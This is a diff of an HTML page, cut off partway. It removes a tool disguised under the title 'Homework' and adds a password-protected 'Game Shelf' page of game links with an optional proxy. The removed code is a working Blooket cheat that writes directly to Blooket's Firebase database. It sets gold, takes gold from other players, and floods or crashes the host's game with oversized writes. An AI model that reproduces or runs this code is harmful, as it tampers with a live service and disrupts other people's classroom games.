@@ -1,415 +1,477 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Homework</title>
-    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
-    <style>
-        * { box-sizing: border-box; touch-action: manipulation; margin: 0; padding: 0; }
-        body {
-            background: #0a0e1a;
-            font-family: 'Courier New', monospace;
-            color: #0f0;
-            padding: 16px;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-        .container {
-            max-width: 700px;
-            width: 100%;
-            background: #111128dd;
-            border: 2px solid #0f0;
-            border-radius: 24px;
-            padding: 24px;
-            box-shadow: 0 0 40px #0f03;
-        }
-        h1 { text-align: center; font-size: 1.8rem; text-shadow: 0 0 20px #0f0; margin-bottom: 18px; }
-        .input {
-            background: #0a0a1a;
-            border: 1.5px solid #0f0;
-            color: #0f0;
-            padding: 14px 16px;
-            border-radius: 12px;
-            font-size: 16px;
-            font-family: inherit;
-            outline: none;
-            width: 100%;
-            margin-bottom: 10px;
-        }
-        .input:focus { border-color: #ff0; box-shadow: 0 0 15px #0f04; }
-        .input::placeholder { color: #4a4a6a; }
-        .btn {
-            background: #1a3a1a;
-            border: 1.5px solid #0f0;
-            color: #0f0;
-            padding: 14px 20px;
-            border-radius: 30px;
-            cursor: pointer;
-            font-weight: bold;
-            font-size: 16px;
-            font-family: inherit;
-            width: 100%;
-            margin: 6px 0;
-            text-align: center;
-            min-height: 54px;
-            transition: 0.1s;
-        }
-        .btn:active { background: #0f0; color: #000; transform: scale(0.97); }
-        .btn-primary { background: #0f0; color: #000; font-size: 18px; }
-        .btn-danger { border-color: #f44; color: #f88; background: #2a0a0a; }
-        .btn-warning { border-color: #fa0; color: #fa0; background: #2a1a0a; }
-        .btn-sm { padding: 10px 14px; font-size: 14px; min-height: 44px; }
-        .status {
-            margin: 14px 0;
-            padding: 12px 16px;
-            background: #0a0a1a;
-            border-left: 4px solid #0f0;
-            border-radius: 8px;
-            font-size: 14px;
-            min-height: 48px;
-            word-break: break-all;
-        }
-        .status.error { border-left-color: #f44; color: #f88; }
-        .status.success { border-left-color: #0f0; color: #0f0; }
-        #cheatPanel { display: none; margin-top: 16px; }
-        .cheat-section { border-top: 1px solid #1a3a1a; padding-top: 14px; margin-top: 14px; }
-        .cheat-section h2 { font-size: 1rem; color: #afa; margin-bottom: 10px; }
-        .cheat-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
-        .cheat-grid-full { grid-column: 1 / -1; }
-        .input-inline { display: flex; gap: 8px; flex-wrap: wrap; align-items: center; }
-        .input-inline .input { flex: 1; min-width: 80px; padding: 10px 12px; font-size: 14px; margin-bottom: 0; }
-        .input-inline select {
-            flex: 1; min-width: 100px; background: #0a0a1a; border: 1.5px solid #0f0;
-            color: #0f0; padding: 10px 12px; border-radius: 10px; font-family: inherit; font-size: 14px; outline: none;
-        }
-        .toggle-row {
-            display: flex; align-items: center; gap: 20px; flex-wrap: wrap; margin: 8px 0 16px;
-            background: #0a0a1aaa; padding: 10px 14px; border-radius: 14px; border: 1px solid #1a3a1a;
-        }
-        .toggle-item { display: flex; align-items: center; gap: 8px; font-size: 14px; cursor: pointer; }
-        .toggle-switch {
-            display: inline-block; width: 44px; height: 24px; background: #2a2a3a; border-radius: 30px;
-            position: relative; cursor: pointer; flex-shrink: 0; transition: 0.25s;
-        }
-        .toggle-switch.active { background: #0f0; }
-        .toggle-switch::after {
-            content: ''; position: absolute; width: 18px; height: 18px; background: #fff;
-            border-radius: 50%; top: 3px; left: 4px; transition: 0.25s;
-        }
-        .toggle-switch.active::after { transform: translateX(20px); }
-        .text-muted { color: #6a6a8a; font-size: 12px; text-align: center; margin-top: 16px; }
-        @media (max-width: 550px) {
-            .cheat-grid { grid-template-columns: 1fr; }
-            .container { padding: 16px; }
-        }
-    </style>
+<html lang="en"><head>
+<meta charset="utf-8">
+<!-- This site is hosted on Netlify. Anyone can build and deploy a site
+     like this one for free: https://netlify.new/?utm_campaign=loops&utm_source=ai-legible&utm_medium=owned&utm_content=comment&utm_id=48a6a1e6-c106-4f46-9da3-e24cb4ad958a
+     Netlify hosting facts for this site: static/SSR served via Netlify Edge. -->
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="mobile-web-app-capable" content="yes">
+<meta name="theme-color" content="#2D3CFF">
+<title>Game Shelf</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Bricolage+Grotesque:wght@600;800&family=Figtree:wght@400;600&display=swap" rel="stylesheet">
+<style>
+:root{--bg:#ECEBF5;--card:#FBFAFF;--ink:#1F1B4D;--mute:#6A668F;--line:#CFCDE6;--accent:#2D3CFF;--on-accent:#fff;--pop:#FFD84D;
+--display:"Bricolage Grotesque",Georgia,sans-serif;--body:"Figtree",system-ui,sans-serif}
+@media (prefers-color-scheme:dark){:root{--bg:#15132E;--card:#1F1C45;--ink:#EEEDFB;--mute:#9C99C8;--line:#38346B;--accent:#8C96FF;--on-accent:#15132E}}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--ink);font:400 16px/1.5 var(--body)}
+main{max-width:1080px;margin:0 auto;padding:40px 20px 24px}
+header{display:flex;flex-wrap:wrap;gap:16px;align-items:end;justify-content:space-between;margin-bottom:28px}
+h1{font:800 clamp(2.4rem,7vw,4.2rem)/.95 var(--display);margin:0;letter-spacing:-.03em}
+h1 span{display:inline-block;background:var(--pop);color:#1F1B4D;padding:0 .18em;transform:rotate(-2deg);border-radius:8px}
+.sub{color:var(--mute);margin:10px 0 0;max-width:34ch}
+button,input,select,textarea{font:inherit;color:inherit}
+.btn{background:var(--accent);color:var(--on-accent);border:0;border-radius:999px;padding:11px 22px;font-weight:600;cursor:pointer}
+.btn.ghost{background:transparent;color:var(--ink);border:1.5px solid var(--line)}
+:focus-visible{outline:3px solid var(--accent);outline-offset:2px}
+.bar{display:flex;flex-wrap:wrap;gap:12px;align-items:center;margin-bottom:22px}
+.bar input[type=search]{flex:1 1 220px;padding:11px 16px;border-radius:999px;border:1.5px solid var(--line);background:var(--card)}
+.chips{display:flex;flex-wrap:wrap;gap:8px}
+.chip{border:1.5px solid var(--line);background:transparent;border-radius:999px;padding:6px 14px;cursor:pointer}
+.chip[aria-pressed=true]{background:var(--ink);color:var(--bg);border-color:var(--ink)}
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(230px,1fr));gap:20px}
+.game{background:var(--card);border-radius:18px;overflow:hidden;border:1.5px solid var(--line);display:flex;flex-direction:column}
+.cover{aspect-ratio:16/10;display:grid;place-items:center;font:800 4.5rem/1 var(--display);color:rgba(255,255,255,.92);overflow:hidden}
+.cover img{width:100%;height:100%;object-fit:cover;display:block}
+.info{padding:14px 16px 16px;display:flex;flex-direction:column;gap:6px;flex:1}
+.info h2{font:600 1.2rem/1.2 var(--display);margin:0}
+.tag{font-size:.85rem;color:var(--mute)}
+.info p{margin:0;font-size:.95rem;flex:1}
+.actions{display:flex;gap:8px;align-items:center;margin-top:8px}
+.actions a{background:var(--accent);color:var(--on-accent);text-decoration:none;font-weight:600;border-radius:999px;padding:7px 18px}
+.actions button{background:none;border:0;color:var(--mute);cursor:pointer;text-decoration:underline;margin-left:auto}
+.empty{grid-column:1/-1;text-align:center;padding:48px 16px;border:2px dashed var(--line);border-radius:18px;color:var(--mute)}
+dialog{border:0;border-radius:20px;padding:26px;background:var(--card);color:var(--ink);width:min(440px,92vw)}
+dialog::backdrop{background:rgba(20,16,60,.55)}
+dialog h2{font:800 1.7rem var(--display);margin:0 0 14px}
+label{display:block;font-weight:600;font-size:.9rem;margin:12px 0 4px}
+dialog input,dialog select,dialog textarea{width:100%;padding:10px 12px;border-radius:10px;border:1.5px solid var(--line);background:var(--bg)}
+.row{display:flex;gap:10px;justify-content:flex-end;margin-top:20px}
+.err{color:#D4263B;font-size:.9rem;min-height:1.2em;margin:8px 0 0}
+footer{display:flex;flex-wrap:wrap;gap:10px;align-items:center;margin-top:36px;padding-top:18px;border-top:1.5px solid var(--line);color:var(--mute);font-size:.9rem}
+footer .btn{padding:7px 16px;font-size:.9rem}
+#player{width:min(1100px,96vw);height:92vh;padding:12px}
+#player[open]{display:flex;flex-direction:column;gap:8px}
+#pframe{flex:1;width:100%;border:0;border-radius:12px;background:#000}
+.phead{display:flex;flex-wrap:wrap;gap:8px;align-items:center;justify-content:space-between}
+.phead strong{font:800 1.2rem var(--display)}
+.pbtns{display:flex;gap:8px;align-items:center;flex-wrap:wrap}
+.pbtns .btn{padding:6px 14px;font-size:.9rem;text-decoration:none;display:inline-block}
+.tog{display:flex;gap:6px;align-items:center;font-size:.9rem;font-weight:600;cursor:pointer}
+.phint{margin:0;font-size:.85rem;color:var(--mute)}
+html{-webkit-text-size-adjust:100%}
+.btn,.chip,.actions a,.actions button,.tog{touch-action:manipulation;min-height:44px}
+.chip{min-height:40px}
+.actions a,.btn{display:inline-flex;align-items:center;justify-content:center}
+@media (max-width:1100px){#player{width:100vw;max-width:100vw;height:100dvh;max-height:100dvh;border-radius:0;padding:max(10px,env(safe-area-inset-top)) max(10px,env(safe-area-inset-right)) max(10px,env(safe-area-inset-bottom)) max(10px,env(safe-area-inset-left))}}
+#gate{position:fixed;inset:0;z-index:50;display:grid;place-items:center;background:var(--bg);padding:20px}
+#gate form{width:min(360px,100%);display:grid;gap:14px}
+#gate input{padding:12px 16px;border-radius:999px;border:1.5px solid var(--line);background:var(--card);font-size:16px}
+body:not(.locked) #gate{display:none}body.locked main{display:none}
+[hidden]{display:none!important}.admin-only{display:none!important}body.admin .admin-only{display:inline-block!important}.cgrid{display:grid;gap:10px}.mono{font:.8rem/1.4 monospace;word-break:break-all;color:var(--mute)}
+@media (prefers-reduced-motion:no-preference){.game{transition:transform .15s}.game:hover{transform:translateY(-3px)}}
+</style>
 </head>
-<body>
-<div class="container">
-    <h1>Homework</h1>
-
-    <input type="text" id="gamePin" class="input" placeholder="Game PIN (6-7 digits)" inputmode="numeric" value="">
-    <input type="text" id="playerName" class="input" placeholder="Your Nickname" value="">
-
-    <div class="toggle-row">
-        <span class="toggle-item" onclick="toggleSwitch(this)">
-            <span class="toggle-switch active" id="incognito"></span>
-              Incognito
-        </span>
-        <span class="toggle-item" onclick="toggleSwitch(this)">
-            <span class="toggle-switch active" id="firstPlace"></span>
-              First Place
-        </span>
-        <span class="toggle-item" onclick="toggleSwitch(this)">
-            <span class="toggle-switch" id="bypassFilter"></span>
-             Bypass Filter
-        </span>
-    </div>
-
-    <button class="btn btn-primary" id="joinBtn">  JOIN & ACTIVATE</button>
-
-    <div id="status" class="status">  Status: Ready</div>
-
-    <div id="cheatPanel">
-        <div class="cheat-section">
-            <h2>  DESTRUCTIVE</h2>
-            <div class="cheat-grid">
-                <button class="btn btn-danger" id="crashHostBtn">💥 Crash Host</button>
-                <button class="btn btn-danger" id="freezeScoreboardBtn">❄️ Freeze Scoreboard</button>
-                <button class="btn btn-danger cheat-grid-full" id="floodAlertBtn">📢 Flood Alert Box</button>
-            </div>
-        </div>
-
-        <div class="cheat-section">
-            <h2>💰 GOLD & RESOURCES</h2>
-            <div class="cheat-grid">
-                <div class="cheat-grid-full input-inline">
-                    <input type="number" id="goldAmount" class="input" placeholder="Gold" value="99999">
-                    <button class="btn btn-sm" id="setGoldBtn">✨ Set My Gold</button>
-                </div>
-                <div class="cheat-grid-full input-inline">
-                    <select id="targetPlayer"><option>— players —</option></select>
-                    <input type="number" id="stealAmount" class="input" placeholder="Amount" value="100">
-                    <button class="btn btn-sm" id="stealGoldBtn">💰 Steal</button>
-                </div>
-            </div>
-        </div>
-
-        <div class="cheat-section">
-            <h2>🎭 BLOOK & UTILITY</h2>
-            <div class="cheat-grid">
-                <div class="cheat-grid-full input-inline">
-                    <select id="blookSelect">
-                        <option>Rainbow Astronaut</option><option>Megalodon</option>
-                        <option>Santa Claus</option><option>Mega Bot</option>
-                        <option>Ghost</option><option>Dragon</option>
-                    </select>
-                    <button class="btn btn-sm" id="setBlookBtn">🎭 Change Blook</button>
-                    <button class="btn btn-sm btn-warning" id="leaveGameBtn">🚪 Leave</button>
-                </div>
-            </div>
-        </div>
-
-        <div class="cheat-section">
-            <h2>🧊 GLOBAL</h2>
-            <button class="btn btn-danger" id="freezeHostBtn">🧊 Freeze Host</button>
-        </div>
-
-        <div class="text-muted">🔒 All actions require an active game connection.</div>
-    </div>
+<body class="">
+<div id="gate" role="dialog" aria-label="Enter password">
+  <form id="gform">
+    <h1>Game <span>Shelf</span></h1>
+    <p class="sub">This site is private.</p>
+    <input id="gpw" type="password" autocapitalize="off" autocorrect="off" spellcheck="false" placeholder="Password" autocomplete="current-password" aria-label="Password">
+    <p class="err" id="gerr" role="alert"></p>
+    <button class="btn" type="button" id="gbtn">Enter</button>
+    <noscript><p class="err">This page needs JavaScript. Open it in Safari from your site link, not as a file preview.</p></noscript>
+  </form>
 </div>
+<main>
+  <header>
+    <div>
+      <h1>Game <span>Shelf</span></h1>
+      <p class="sub">Every game you like to play, one click away.</p>
+    </div>
+    <button class="btn admin-only" id="open">Add a game</button>
+  </header>
+
+  <div class="bar">
+    <input type="search" id="q" placeholder="Search games" aria-label="Search games">
+    <div class="chips" id="chips"><button class="chip" aria-pressed="true">All</button></div>
+  </div>
+
+  <div class="grid" id="grid"><article class="game"><div class="cover" style="background: rgb(23, 163, 152);">B</div><div class="info"><h2>Balatro</h2><p></p><div class="actions"><a href="https://telatro.tomcat.sh/game/" target="_blank" rel="noopener noreferrer">Play</a><button class="admin-only">Remove</button></div></div></article><article class="game"><div class="cover" style="background: rgb(58, 125, 68);">B</div><div class="info"><h2>Binding of isaac</h2><p></p><div class="actions"><a href="https://tboi.online/" target="_blank" rel="noopener noreferrer">Play</a><button class="admin-only">Remove</button></div></div></article><article class="game"><div class="cover" style="background: rgb(45, 60, 255);">B</div><div class="info"><h2>brotato</h2><p></p><div class="actions"><a href="https://wasm.rip/files/bpac/index.html" target="_blank" rel="noopener noreferrer">Play</a><button class="admin-only">Remove</button></div></div></article><article class="game"><div class="cover" style="background: rgb(216, 30, 91);">C</div><div class="info"><h2>cloverpit</h2><p></p><div class="actions"><a href="https://genizymath.github.io/iframe/716-fix3.html" target="_blank" rel="noopener noreferrer">Play</a><button class="admin-only">Remove</button></div></div></article></div>
+
+  <footer>
+    <span id="count">4 games</span>
+    <button class="btn ghost" id="console" style="margin-left:auto">Console</button>
+    <input type="file" id="file" accept="application/json" hidden="">
+  </footer>
+</main>
+
+<dialog id="player" aria-label="Game player">
+  <div class="phead">
+    <strong id="ptitle"></strong>
+    <span class="pbtns">
+      <label class="tog"><input type="checkbox" id="pproxy" style="width:auto;padding:0"> Proxy</label>
+      <a class="btn ghost" id="pnew" target="_blank" rel="noopener noreferrer">Open in new tab</a>
+      <button class="btn ghost" id="pfull">Fullscreen</button>
+      <button class="btn" id="pclose">Close</button>
+    </span>
+  </div>
+  <iframe id="pframe" title="Game" allow="fullscreen; gamepad; autoplay; clipboard-write; accelerometer; gyroscope" referrerpolicy="no-referrer" sandbox="allow-scripts allow-same-origin allow-forms allow-pointer-lock allow-popups"></iframe>
+  <p class="phint" id="phint">Blank screen? That site doesn't allow embedding. Switch Proxy on above, or use Open in new tab.</p>
+</dialog>
+
+<dialog id="con">
+  <h2>Dev console</h2>
+  <div id="locked">
+    <label for="pw">Password</label>
+    <input id="pw" type="password" autocapitalize="off" autocorrect="off" spellcheck="false" autocomplete="current-password">
+    <p class="err" id="pwerr" role="alert"></p>
+    <div class="row"><button class="btn ghost" id="pwcancel">Close</button><button class="btn" id="unlock">Unlock</button></div>
+  </div>
+  <div id="panel" class="cgrid" hidden="">
+    <p class="tag" style="margin:0">Unlocked. Add and Remove buttons are now visible on the page.</p>
+    <button class="btn ghost" id="export">Download games.json</button>
+    <button class="btn ghost" id="import">Import games.json</button>
+    <label for="pxurl" style="margin-bottom:0">Server address (your Cloudflare Worker)</label>
+    <input id="pxurl" type="url" placeholder="https://something.workers.dev">
+    <p class="tag" style="margin:0">Saved in this browser only. For all visitors, also paste it into SERVER in index.html.</p>
+    <label for="newpw" style="margin-bottom:0">Local-only password hash (used when no server is set)</label>
+    <input id="newpw" placeholder="Type a new password" autocomplete="off">
+    <div class="mono" id="newhash"></div>
+    <div class="row"><button class="btn ghost" id="lock">Lock</button><button class="btn" id="close">Done</button></div>
+  </div>
+</dialog>
+
+<dialog id="dlg">
+  <form method="dialog" id="form">
+    <h2>Add a game</h2>
+    <label for="f-title">Title</label>
+    <input id="f-title" required="" maxlength="60">
+    <label for="f-url">Link to play</label>
+    <input id="f-url" type="url" required="" placeholder="https://">
+    <label for="f-genre">Genre</label>
+    <input id="f-genre" list="genres" placeholder="Puzzle, Racing, Platformer…" maxlength="24">
+    <datalist id="genres"><option>Puzzle</option><option>Arcade</option><option>Action</option><option>Strategy</option><option>Racing</option><option>Platformer</option></datalist>
+    <label for="f-img">Cover image URL (optional)</label>
+    <input id="f-img" type="url" placeholder="https://">
+    <label for="f-desc">Short note (optional)</label>
+    <textarea id="f-desc" rows="2" maxlength="140"></textarea>
+    <label style="display:flex;gap:8px;align-items:center;font-weight:400"><input type="checkbox" id="f-proxy" style="width:auto"> Open through my proxy</label>
+    <p class="err" id="err" role="alert"></p>
+    <div class="row">
+      <button type="button" class="btn ghost" id="cancel">Cancel</button>
+      <button type="submit" class="btn">Save game</button>
+    </div>
+  </form>
+</dialog>
 
 <script>
-// ============================================================
-//  WORKING VERSION - Direct Firebase Connection
-// ============================================================
+window.addEventListener("error",e=>{const g=document.getElementById("gerr");if(g)g.textContent="Error: "+e.message});
+// No games ship with the site. To add games for every visitor, put a games.json
+// next to this file (see README) and it replaces these.
+const SEED = [];
+const PASS_HASH="676030ce34acea9f714a50288e162e2b65af79d2a5888faabddda1806dcb12b3"; // console password (SHA-256 of "gameshelf:" + password)
+const SITE_HASH="676030ce34acea9f714a50288e162e2b65af79d2a5888faabddda1806dcb12b3"; // site password, asked before anyone can see the page
+const SERVER="https://shy-wave-a7eb.thegreatsnowyfox.workers.dev";       // paste your Cloudflare Worker URL here: it stores the shared game list and runs the proxy
+const KEY="gameshelf:v1";
+const COLORS=["#2D3CFF","#E4572E","#17A398","#7B2CBF","#D81E5B","#3A7D44","#F18F01"];
+let mem={added:[],hidden:[]};   // fallback if storage is blocked
+let base=SEED, filter="All";
+const $=id=>document.getElementById(id);
 
-function toggleSwitch(el) {
-    const toggle = el.querySelector('.toggle-switch');
-    if (toggle) toggle.classList.toggle('active');
+function load(){try{const v=JSON.parse(localStorage.getItem(KEY));if(v&&Array.isArray(v.added))return v}catch(e){}return mem}
+function save(d){mem=d;try{localStorage.setItem(KEY,JSON.stringify(d))}catch(e){}}
+const safeUrl=u=>{try{const x=new URL(u);return /^https?:$/.test(x.protocol)?x.href:null}catch(e){return null}};
+let serverOn=false;
+const all=()=>{if(serverOn)return base;const d=load();return base.concat(d.added).filter(g=>!d.hidden.includes(g.id))};
+
+function render(){
+  const games=all(), q=$("q").value.trim().toLowerCase();
+  const genres=["All",...new Set(games.map(g=>g.genre).filter(Boolean))];
+  if(!genres.includes(filter))filter="All";
+  const chips=$("chips");chips.textContent="";
+  genres.forEach(g=>{const b=document.createElement("button");b.className="chip";b.textContent=g;
+    b.setAttribute("aria-pressed",g===filter);b.onclick=()=>{filter=g;render()};chips.append(b)});
+  const list=games.filter(g=>(filter==="All"||g.genre===filter)&&(!q||(g.title+" "+(g.desc||"")+" "+(g.genre||"")).toLowerCase().includes(q)));
+  const grid=$("grid");grid.textContent="";
+  if(!list.length){const e=document.createElement("div");e.className="empty";
+    e.textContent=games.length?"No games match. Try another search or genre.":"Your shelf is empty. Add your first game.";grid.append(e)}
+  list.forEach(g=>{
+    const c=document.createElement("article");c.className="game";
+    const cv=document.createElement("div");cv.className="cover";
+    const h=[...g.title].reduce((a,ch)=>a+ch.charCodeAt(0),0);
+    const tile=()=>{cv.textContent=g.title.trim()[0]?.toUpperCase()||"?";cv.style.background=COLORS[h%COLORS.length]};
+    const img=g.img&&safeUrl(g.img);
+    if(img){const i=document.createElement("img");i.src=img;i.alt="";i.loading="lazy";i.onerror=()=>{cv.textContent="";cv.style.background="";tile()};cv.append(i)}else tile();
+    const info=document.createElement("div");info.className="info";
+    const t=document.createElement("h2");t.textContent=g.title;
+    const p=document.createElement("p");p.textContent=g.desc||"";
+    const acts=document.createElement("div");acts.className="actions";
+    const a=document.createElement("a");const href=safeUrl(g.url);a.href=g.proxy&&serverBase()&&href?serverBase()+"?url="+encodeURIComponent(href):href||"#";a.target="_blank";a.rel="noopener noreferrer";a.textContent="Play";a.onclick=e=>{if(a.getAttribute("href")!=="#"){e.preventDefault();play(g)}};
+    const rm=document.createElement("button");rm.className="admin-only";rm.textContent="Remove";rm.onclick=()=>remove(g);
+    acts.append(a,rm);
+    info.append(t);
+    if(g.genre){const tg=document.createElement("div");tg.className="tag";tg.textContent=g.genre;info.append(tg)}
+    info.append(p,acts);c.append(cv,info);grid.append(c);
+  });
+  $("count").textContent=games.length+(games.length===1?" game":" games");
 }
 
-function isToggled(id) {
-    const el = document.getElementById(id);
-    return el ? el.classList.contains('active') : false;
+function remove(g){
+  if(g.srv){api("DELETE","/games/"+encodeURIComponent(g.id)).then(refresh).catch(x=>alert("Couldn't remove: "+x.message));return}
+  const d=load();
+  if(d.added.some(x=>x.id===g.id))d.added=d.added.filter(x=>x.id!==g.id);else d.hidden.push(g.id);
+  save(d);render();
 }
 
-const $ = id => document.getElementById(id);
-
-let activeGame = null;
-let db = null;
-let firebaseApp = null;
-
-function setStatus(msg, type = 'info') {
-    const el = $('status');
-    if (!el) return;
-    el.textContent = '🔹 ' + msg;
-    el.className = 'status';
-    if (type === 'error') el.classList.add('error');
-    if (type === 'success') el.classList.add('success');
+let cur=null;
+const HINT="Blank screen? That site doesn't allow embedding. Switch Proxy on above, or use Open in new tab.";
+function serverBase(){try{return localStorage.getItem("gs-proxy")||SERVER}catch(e){return SERVER}}
+function loadGame(){
+  const direct=safeUrl(cur.url),pb=serverBase(),on=$("pproxy").checked;
+  $("phint").textContent=on&&!pb?"No server address set yet. Unlock the Console, paste your Worker address, then try again.":HINT;
+  const src=on&&pb?pb+"?url="+encodeURIComponent(direct):direct;
+  $("pframe").src=src;$("pnew").href=src;
 }
-
-// TESTED WORKING METHOD - Connect directly to Blooket Firebase
-$('joinBtn').onclick = async () => {
-    const pin = $('gamePin').value.trim();
-    const name = $('playerName').value.trim();
-    
-    if (!pin || !name) {
-        setStatus('❌ Enter Game PIN and Nickname!', 'error');
-        return;
-    }
-
-    setStatus('🔄 Attempting connection...', 'info');
-    $('joinBtn').disabled = true;
-
-    try {
-        // Clean up previous connection
-        if (firebaseApp) {
-            await firebaseApp.delete().catch(() => {});
-            firebaseApp = null;
-            db = null;
-        }
-
-        // Connect directly to Blooket's Firebase
-        // They use the same database for all games
-        firebaseApp = firebase.initializeApp({
-            databaseURL: "https://blooket-2020-default-rtdb.firebaseio.com",
-            projectId: "blooket-2020"
-        }, 'blooketCheat_' + Date.now());
-
-        db = firebase.database();
-
-        setStatus('🔍 Checking game...', 'info');
-
-        // Check if game exists
-        const gameSnap = await db.ref(pin).once('value');
-        const gameData = gameSnap.val();
-
-        if (!gameData) {
-            throw new Error('Game not found! Check the PIN.');
-        }
-
-        setStatus('👤 Joining as ' + name + '...', 'info');
-
-        // Join the game by adding yourself to players list
-        await db.ref(pin + '/c/' + name).set({
-            n: name,
-            g: 500,
-            b: 'Dog',
-            tat: ''
-        });
-
-        activeGame = { pin, name };
-        setStatus('✅ Connected! Cheats active.', 'success');
-        $('cheatPanel').style.display = 'block';
-
-        // Load other players
-        await loadPlayerList();
-
-        // Listen for player changes
-        db.ref(pin + '/c').on('value', (snap) => {
-            const players = snap.val();
-            if (!players || !players[name]) {
-                setStatus('⚠️ You were removed!', 'error');
-                $('cheatPanel').style.display = 'none';
-                activeGame = null;
-            } else {
-                loadPlayerList();
-            }
-        });
-
-        // Listen for game end
-        db.ref(pin + '/h').on('value', (snap) => {
-            if (snap.val()) {
-                setStatus('🏁 Game state changed', 'info');
-            }
-        });
-
-    } catch (err) {
-        console.error('Connection error:', err);
-        setStatus('❌ Error: ' + err.message, 'error');
-        
-        // Show debug info
-        if (err.message.includes('Game not found')) {
-            setStatus('❌ Game PIN ' + pin + ' not found. Make sure game is active.', 'error');
-        } else if (err.message.includes('PERMISSION_DENIED')) {
-            setStatus('❌ Permission denied. Game might be private or ended.', 'error');
-        } else {
-            setStatus('❌ ' + err.message, 'error');
-        }
-        
-        // Still show panel for testing
-        $('cheatPanel').style.display = 'block';
-        setStatus('⚠️ Panel shown but NOT connected. Fix the error above.', 'error');
-    } finally {
-        $('joinBtn').disabled = false;
-    }
-};
-
-// Firebase write helper
-async function firebaseWrite(path, value) {
-    if (!activeGame || !db) {
-        alert('❌ Not connected! Join a game first.');
-        return false;
-    }
-    try {
-        const fullPath = activeGame.pin + '/c/' + activeGame.name + '/' + path;
-        console.log('Writing to:', fullPath, 'Value:', value);
-        await db.ref(fullPath).set(value);
-        return true;
-    } catch (e) {
-        console.error('Write error:', e);
-        alert('❌ Write failed: ' + e.message);
-        return false;
-    }
+function play(g){
+  cur=g;$("ptitle").textContent=g.title;
+  $("pproxy").checked=!!(g.proxy&&serverBase());
+  loadGame();$("player").showModal();
 }
+$("pproxy").onchange=loadGame;
+$("pclose").onclick=()=>$("player").close();
+$("pfull").onclick=()=>{const f=$("pframe");(f.requestFullscreen||f.webkitRequestFullscreen||(()=>{})).call(f)};
+$("player").addEventListener("close",()=>{$("pframe").src="about:blank"});
+const dlg=$("dlg");
+$("open").onclick=()=>{$("form").reset();$("err").textContent="";dlg.showModal();$("f-title").focus()};
+$("cancel").onclick=()=>dlg.close();
+$("form").addEventListener("submit",e=>{
+  const url=safeUrl($("f-url").value.trim()),imgRaw=$("f-img").value.trim();
+  if(!url){e.preventDefault();$("err").textContent="Enter a link that starts with http:// or https://";return}
+  if(imgRaw&&!safeUrl(imgRaw)){e.preventDefault();$("err").textContent="The cover image link must start with http:// or https://";return}
+  const g={id:"u"+Date.now(),title:$("f-title").value.trim(),url,genre:$("f-genre").value.trim(),img:imgRaw,desc:$("f-desc").value.trim(),proxy:$("f-proxy").checked};
+  if(serverBase()){api("POST","/games",g).then(refresh).catch(x=>alert("Couldn't save to the server: "+x.message));return}
+  const d=load();d.added.push(g);save(d);render();
+});
+$("q").oninput=render;
 
-// All cheat buttons
-$('crashHostBtn').onclick = async () => {
-    if (await firebaseWrite('g/t', 't')) setStatus('💥 Crash sent!', 'success');
+$("export").onclick=()=>{
+  const blob=new Blob([JSON.stringify(all(),null,2)],{type:"application/json"});
+  const a=document.createElement("a");a.href=URL.createObjectURL(blob);a.download="games.json";a.click();URL.revokeObjectURL(a.href);
+};
+$("import").onclick=()=>$("file").click();
+$("file").onchange=async e=>{
+  try{
+    const arr=JSON.parse(await e.target.files[0].text());
+    if(!Array.isArray(arr))throw 0;
+    if(serverBase()){await api("POST","/games",arr.filter(g=>g&&g.title&&safeUrl(g.url)));await refresh();e.target.value="";return}
+    const d=load(), ids=new Set(all().map(g=>g.id));
+    arr.filter(g=>g&&g.title&&safeUrl(g.url)&&!ids.has(g.id)).forEach(g=>d.added.push({id:g.id||"i"+Math.random().toString(36).slice(2),title:String(g.title),url:g.url,genre:g.genre||"",img:g.img||"",desc:g.desc||"",proxy:!!g.proxy}));
+    save(d);render();
+  }catch(err){alert("That file isn't a valid games.json.")}
+  e.target.value="";
 };
 
-$('freezeScoreboardBtn').onclick = async () => {
-    if (await firebaseWrite('tat/t', 't')) setStatus('❄️ Frozen!', 'success');
-};
-
-$('setGoldBtn').onclick = async () => {
-    const amt = parseInt($('goldAmount').value) || 99999;
-    if (await firebaseWrite('g', amt)) setStatus('💰 Gold: ' + amt, 'success');
-};
-
-$('stealGoldBtn').onclick = async () => {
-    const target = $('targetPlayer').value;
-    if (!target || target === '— players —') return alert('Select player!');
-    const amt = $('stealAmount').value || 100;
-    if (await firebaseWrite('tat', target + ':' + amt)) setStatus('💰 Stolen!', 'success');
-};
-
-$('setBlookBtn').onclick = async () => {
-    const blook = $('blookSelect').value;
-    if (await firebaseWrite('b', blook)) setStatus('🎭 Changed to ' + blook, 'success');
-};
-
-$('leaveGameBtn').onclick = async () => {
-    if (!activeGame || !db) return;
-    try {
-        await db.ref(activeGame.pin + '/c/' + activeGame.name).remove();
-        setStatus('🚪 Left game', 'info');
-        $('cheatPanel').style.display = 'none';
-        activeGame = null;
-    } catch (e) {
-        alert('Error: ' + e.message);
-    }
-};
-
-$('floodAlertBtn').onclick = async () => {
-    const flood = 'SPAM'.repeat(500);
-    if (await firebaseWrite('tat', flood)) setStatus('📢 Flooded!', 'success');
-};
-
-$('freezeHostBtn').onclick = async () => {
-    const bigData = 'A'.repeat(100000);
-    if (await firebaseWrite('g', bigData)) setStatus('🧊 Frozen!', 'success');
-};
-
-// Load players list
-async function loadPlayerList() {
-    if (!activeGame || !db) return;
-    try {
-        const snap = await db.ref(activeGame.pin + '/c').once('value');
-        const players = snap.val() || {};
-        const select = $('targetPlayer');
-        select.innerHTML = '';
-        
-        let hasPlayers = false;
-        for (let name in players) {
-            if (name !== activeGame.name) {
-                select.innerHTML += `<option value="${name}">${name} (💰 ${players[name].g || 0})</option>`;
-                hasPlayers = true;
-            }
-        }
-        
-        if (!hasPlayers) {
